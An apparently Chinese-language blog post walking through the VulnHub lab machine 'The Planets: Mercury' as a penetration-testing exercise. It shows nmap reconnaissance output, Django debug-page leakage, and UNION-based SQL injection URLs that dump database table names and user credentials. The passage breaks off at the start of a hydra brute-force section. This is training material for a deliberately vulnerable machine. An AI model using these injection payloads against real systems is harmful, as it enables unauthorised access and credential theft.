@@ -1,0 +1,754 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机精讲之THE PLANETS MERCURY，一台vulnhub靶机，标准攻击链明快利落，让你学的每一点渗透知识都非常有价值，用到的都是大路知识，并不冷门。算是一台攻击链样板机了。  THE PLANETS MERCURY 靶机信息收集123456789101112┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THE PLANETS MERCURY">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/06/b0b39d4ac246.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="靶机精讲之THE PLANETS MERCURY，一台vulnhub靶机，标准攻击链明快利落，让你学的每一点渗透知识都非常有价值，用到的都是大路知识，并不冷门。算是一台攻击链样板机了。  THE PLANETS MERCURY 靶机信息收集123456789101112┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/e9215d54b0cd5b980a83ebb27ec93f15_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/e83667242e122ac19a5f3d2c3dc4f0e2_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/5156dfaaebb877705576bf6c47753cb9_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/0279128c42f066ec361ec0f22735f845_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/6fe0bf43c027783002641b84a82a70e6_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/cbdd3c2cbe59a4a1af1e58e8b9fc0db0_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/748645592915b191f4f268c39705a522_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/1af6d2411def27c65331eae570c8e79d_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/3b930fd2509f98fb14d7f2a6cce2190d_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/3814771863a9914b919cef5a17530de0_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/9e40e78bf879928a3d86a5807cbce870_MD5.png">
+<meta property="article:published_time" content="2023-06-16T01:49:42.000Z">
+<meta property="article:modified_time" content="2023-06-17T03:23:59.162Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/e9215d54b0cd5b980a83ebb27ec93f15_MD5.png">
+  
+  
+  
+  <title>THE PLANETS MERCURY - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="THE PLANETS MERCURY"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-16 09:49" pubdate>
+          2023年6月16日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          23k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          195 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">THE PLANETS MERCURY</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>靶机精讲之THE PLANETS MERCURY，一台vulnhub靶机，标准攻击链明快利落，让你学的每一点渗透知识都非常有价值，用到的都是大路知识，并不冷门。算是一台攻击链样板机了。</p>
+</blockquote>
+<h1 id="THE-PLANETS-MERCURY-靶机"><a href="#THE-PLANETS-MERCURY-靶机" class="headerlink" title="THE PLANETS MERCURY 靶机"></a>THE PLANETS MERCURY 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.115    <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-15 07:58 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.115<br>Host is up (0.00072s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>8080/tcp open  http-proxy<br>MAC Address: 08:00:27:D5:99:58 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.18 seconds<br></code></pre></td></tr></table></figure>
+
+<p>端口扫描的结果显示，TCP 端口中开启了 22 和 8080 端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -O -sC -p22,8080 192.168.56.115        <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-15 07:59 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.115<br>Host is up (0.00040s latency).<br><br>PORT     STATE SERVICE    VERSION<br>22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)<br>|   256 e8:08:a1:8e:7d:5a:bc:5c:66:16:48:24:57:0d:fa:b8 (ECDSA)<br>|_  256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)<br>8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2<br>| fingerprint-strings: <br>|   FourOhFourRequest: <br>|     HTTP/1.1 404 Not Found<br>|     Date: Thu, 15 Jun 2023 00:59:20 GMT<br>|     Server: WSGIServer/0.2 CPython/3.8.2<br>|     Content-Type: text/html<br>|     X-Frame-Options: DENY<br>|     Content-Length: 2366<br>|     X-Content-Type-Options: nosniff<br>|     Referrer-Policy: same-origin<br>|     &lt;!DOCTYPE html&gt;<br>|     &lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Page not found at /nice ports,/Trinity.txt.bak&lt;/title&gt;<br>|     &lt;meta name=<span class="hljs-string">&quot;robots&quot;</span> content=<span class="hljs-string">&quot;NONE,NOARCHIVE&quot;</span>&gt;<br>|     &lt;style <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;<br>|     html * &#123; padding:0; margin:0; &#125;<br>|     body * &#123; padding:10px 20px; &#125;<br>|     body * * &#123; padding:0; &#125;<br>|     body &#123; font:small sans-serif; background:<span class="hljs-comment">#eee; color:#000; &#125;</span><br>|     body&gt;div &#123; border-bottom:1px solid <span class="hljs-comment">#ddd; &#125;</span><br>|     font-weight:normal; margin-bottom:.4em; &#125;<br>|     span &#123; font-size:60%; color:<span class="hljs-comment">#666; font-weight:normal; &#125;</span><br>|     table &#123; border:none; border-collapse: collapse; width:100%; &#125;<br>|     vertical-align:<br>|   GetRequest, HTTPOptions: <br>|     HTTP/1.1 200 OK<br>|     Date: Thu, 15 Jun 2023 00:59:20 GMT<br>|     Server: WSGIServer/0.2 CPython/3.8.2<br>|     Content-Type: text/html; charset=utf-8<br>|     X-Frame-Options: DENY<br>|     Content-Length: 69<br>|     X-Content-Type-Options: nosniff<br>|     Referrer-Policy: same-origin<br>|     Hello. This site is currently <span class="hljs-keyword">in</span> development please check back later.<br>|   RTSPRequest: <br>|     &lt;!DOCTYPE HTML PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br>|     <span class="hljs-string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;<br>|     &lt;html&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error response&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;h1&gt;Error response&lt;/h1&gt;<br>|     &lt;p&gt;Error code: 400&lt;/p&gt;<br>|     &lt;p&gt;Message: Bad request version (<span class="hljs-string">&#x27;RTSP/1.0&#x27;</span>).&lt;/p&gt;<br>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;<br>|     &lt;/body&gt;<br>|_    &lt;/html&gt;<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html; charset=utf-8).</span><br><span class="hljs-string">|_http-server-header: WSGIServer/0.2 CPython/3.8.2</span><br><span class="hljs-string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-string">SF-Port8080-TCP:V=7.92%I=7%D=6/15%Time=648AFD15%P=x86_64-pc-linux-gnu%r(Ge</span><br><span class="hljs-string">SF:tRequest,135,&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2015\x20Jun\x202</span><br><span class="hljs-string">SF:023\x2000:59:20\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.8\.2</span><br><span class="hljs-string">SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options:\x2</span><br><span class="hljs-string">SF:0DENY\r\nContent-Length:\x2069\r\nX-Content-Type-Options:\x20nosniff\r\</span><br><span class="hljs-string">SF:nReferrer-Policy:\x20same-origin\r\n\r\nHello\.\x20This\x20site\x20is\x</span><br><span class="hljs-string">SF:20currently\x20in\x20development\x20please\x20check\x20back\x20later\.&quot;</span><br><span class="hljs-string">SF:)%r(HTTPOptions,135,&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2015\x20J</span><br><span class="hljs-string">SF:un\x202023\x2000:59:20\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/</span><br><span class="hljs-string">SF:3\.8\.2\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Opti</span><br><span class="hljs-string">SF:ons:\x20DENY\r\nContent-Length:\x2069\r\nX-Content-Type-Options:\x20nos</span><br><span class="hljs-string">SF:niff\r\nReferrer-Policy:\x20same-origin\r\n\r\nHello\.\x20This\x20site\</span><br><span class="hljs-string">SF:x20is\x20currently\x20in\x20development\x20please\x20check\x20back\x20l</span><br><span class="hljs-string">SF:ater\.&quot;)%r(RTSPRequest,1F4,&quot;&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3C//DT</span><br><span class="hljs-string">SF:D\x20HTML\x204\.01//EN\&quot;\n\x20\x20\x20\x20\x20\x20\x20\x20\&quot;http://www\</span><br><span class="hljs-string">SF:.w3\.org/TR/html4/strict\.dtd\&quot;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\</span><br><span class="hljs-string">SF:x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&quot;Content-Type\&quot;\x20cont</span><br><span class="hljs-string">SF:ent=\&quot;text/html;charset=utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;titl</span><br><span class="hljs-string">SF:e&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;</span><br><span class="hljs-string">SF:body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20response&lt;/h1&gt;\n\x20</span><br><span class="hljs-string">SF:\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\n\x20\x20\x20\</span><br><span class="hljs-string">SF:x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20version\x20\(&#x27;</span>RTSP/<br>SF:1\.0<span class="hljs-string">&#x27;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code\x20expl</span><br><span class="hljs-string">SF:anation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20syntax\x2</span><br><span class="hljs-string">SF:0or\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;</span><br><span class="hljs-string">SF:)%r(FourOhFourRequest,A28,&quot;HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x2</span><br><span class="hljs-string">SF:0Thu,\x2015\x20Jun\x202023\x2000:59:20\x20GMT\r\nServer:\x20WSGIServer/</span><br><span class="hljs-string">SF:0\.2\x20CPython/3\.8\.2\r\nContent-Type:\x20text/html\r\nX-Frame-Option</span><br><span class="hljs-string">SF:s:\x20DENY\r\nContent-Length:\x202366\r\nX-Content-Type-Options:\x20nos</span><br><span class="hljs-string">SF:niff\r\nReferrer-Policy:\x20same-origin\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;htm</span><br><span class="hljs-string">SF:l\x20lang=\&quot;en\&quot;&gt;\n&lt;head&gt;\n\x20\x20&lt;meta\x20http-equiv=\&quot;content-type\&quot;</span><br><span class="hljs-string">SF:\x20content=\&quot;text/html;\x20charset=utf-8\&quot;&gt;\n\x20\x20&lt;title&gt;Page\x20no</span><br><span class="hljs-string">SF:t\x20found\x20at\x20/nice\x20ports,/Trinity\.txt\.bak&lt;/title&gt;\n\x20\x20</span><br><span class="hljs-string">SF:&lt;meta\x20name=\&quot;robots\&quot;\x20content=\&quot;NONE,NOARCHIVE\&quot;&gt;\n\x20\x20&lt;style</span><br><span class="hljs-string">SF:\x20type=\&quot;text/css\&quot;&gt;\n\x20\x20\x20\x20html\x20\*\x20&#123;\x20padding:0;\x</span><br><span class="hljs-string">SF:20margin:0;\x20&#125;\n\x20\x20\x20\x20body\x20\*\x20&#123;\x20padding:10px\x2020</span><br><span class="hljs-string">SF:px;\x20&#125;\n\x20\x20\x20\x20body\x20\*\x20\*\x20&#123;\x20padding:0;\x20&#125;\n\x2</span><br><span class="hljs-string">SF:0\x20\x20\x20body\x20&#123;\x20font:small\x20sans-serif;\x20background:#eee;</span><br><span class="hljs-string">SF:\x20color:#000;\x20&#125;\n\x20\x20\x20\x20body&gt;div\x20&#123;\x20border-bottom:1p</span><br><span class="hljs-string">SF:x\x20solid\x20#ddd;\x20&#125;\n\x20\x20\x20\x20h1\x20&#123;\x20font-weight:normal</span><br><span class="hljs-string">SF:;\x20margin-bottom:\.4em;\x20&#125;\n\x20\x20\x20\x20h1\x20span\x20&#123;\x20font</span><br><span class="hljs-string">SF:-size:60%;\x20color:#666;\x20font-weight:normal;\x20&#125;\n\x20\x20\x20\x20</span><br><span class="hljs-string">SF:table\x20&#123;\x20border:none;\x20border-collapse:\x20collapse;\x20width:10</span><br><span class="hljs-string">SF:0%;\x20&#125;\n\x20\x20\x20\x20td,\x20th\x20&#123;\x20vertical-align:&quot;);</span><br><span class="hljs-string">MAC Address: 08:00:27:D5:99:58 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.6</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 94.90 seconds</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>8080 端口下有个 robots.txt，点进去并没有发现有价值的信息。还探测到了 WSGIServer&#x2F;0.2 CPython&#x2F;3.8.2 搜了一下似乎某个采用这两个组件的系统存在漏洞。</p>
+<p><img src="/pic/e9215d54b0cd5b980a83ebb27ec93f15_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试其中的路径，得到了错误返回，看来并不是这个系统，但是错误返回里包含了我们所想寻找的信息</p>
+<p><img src="/pic/e83667242e122ac19a5f3d2c3dc4f0e2_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>由于开发者开启了 DEBUG 模式，因此服务器返回了敏感信息，我们从中得到了我们需要的目录信息</p>
+<p><img src="/pic/5156dfaaebb877705576bf6c47753cb9_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>目录中有两个子链，分别指向 todo 和 1</p>
+<p><img src="/pic/0279128c42f066ec361ec0f22735f845_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><p>todo 中给定了一些开发者在开发过程中留下的计划，我们可以得知两个事情：一是目前没有鉴权，二是目前是直接和 mysql 进行交互的。我们看看另一个链接，其中包含数字，可能存在 SQL 注入</p>
+<p><img src="/pic/6fe0bf43c027783002641b84a82a70e6_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试单引号</p>
+<p><img src="/pic/cbdd3c2cbe59a4a1af1e58e8b9fc0db0_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>单引号报错，返回信息中确认了是 MySQL 数据库，似乎是数字型注入，不需要闭合，接下来尝试 union 联合注入，首先使用 order by</p>
+<p><img src="/pic/748645592915b191f4f268c39705a522_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来使用联合查询</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.56.115:8080/mercuryfacts/-1 union <span class="hljs-keyword">select</span> database()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/pic/1af6d2411def27c65331eae570c8e79d_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>确认了数据库名，接下来查看数据库下的表名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.56.115:8080/mercuryfacts/1 union <span class="hljs-keyword">select</span> group_concat(table_name) from information_schema.tables <span class="hljs-built_in">where</span> table_schema = <span class="hljs-string">&#x27;mercury&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/pic/3b930fd2509f98fb14d7f2a6cce2190d_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>表中的列名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.56.115:8080/mercuryfacts/1 union <span class="hljs-keyword">select</span> group_concat(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name = <span class="hljs-string">&#x27;users&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/pic/3814771863a9914b919cef5a17530de0_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后直接查询数据库即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.56.115:8080/mercuryfacts/2 union <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">id</span>,0x2d,password,0x2d,username) from <span class="hljs-built_in">users</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/pic/9e40e78bf879928a3d86a5807cbce870_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h3><p>收集用户名和密码，按行写入到文件中，在使用 awk 工具来将用户名和密码存入对应的文件</p>
